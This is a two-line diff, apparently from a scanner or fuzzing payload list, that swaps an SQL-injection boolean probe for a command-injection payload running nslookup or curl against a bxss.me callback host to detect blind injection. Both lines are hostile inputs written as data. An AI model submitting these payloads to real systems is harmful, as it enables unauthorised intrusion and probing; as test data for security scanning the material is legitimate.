@@ -1,1 +1,1 @@
--1' OR 2+946-946-1=0+0+0+1 or 'hNi8q3Kk'='
+(nslookup -q=cname hitxgnfkbcbxt7af8a.bxss.me||curl hitxgnfkbcbxt7af8a.bxss.me))
